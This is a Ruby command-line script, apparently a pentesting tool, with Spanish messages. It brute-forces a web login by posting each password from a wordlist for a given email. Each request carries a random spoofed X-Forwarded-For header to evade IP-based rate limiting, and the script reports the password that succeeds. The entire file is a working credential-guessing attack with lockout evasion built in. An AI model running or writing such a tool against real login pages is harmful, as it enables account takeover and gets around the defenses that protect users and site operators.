require 'net/http'
require 'uri'
require 'json'

target_url, email, wordlist_path = ARGV

if ARGV.length < 3
  puts "Uso: ruby pass_brute.rb <url> <email> <wordlist>"
  exit
end

puts "\e[34m[*] Brute Force password #{email}\e[0m"

File.foreach(wordlist_path) do |linea|
  password = linea.strip
  ip_falsa = Array.new(4) { rand(256) }.join('.')
  uri = URI.parse(target_url)

  request = Net::HTTP::Post.new(uri.path)
  request['Content-Type'] = 'application/json'
  request['X-Forwarded-For'] = ip_falsa
  request.body = { email: email, password: password }.to_json
  
  response = Net::HTTP.start(uri.host, uri.port) { |http| http.request(request) }
  
  status = response.code
  
  if status == "302" || (status == "200" && response.body.include?("success"))
    puts "\e[1;32m[+] #{email.ljust(25)} | SUCCESS | Pass: #{password.ljust(15)} | Status: #{status} | IP: #{ip_falsa}\e[0m"
    exit
  else
    puts "[-] #{email.ljust(25)} | FAILED  | Pass: #{password.ljust(15)} | Status: #{status} | IP: #{ip_falsa}"
  end
end

puts "\n\e[31m[-] No se encontró la password.\e[0m"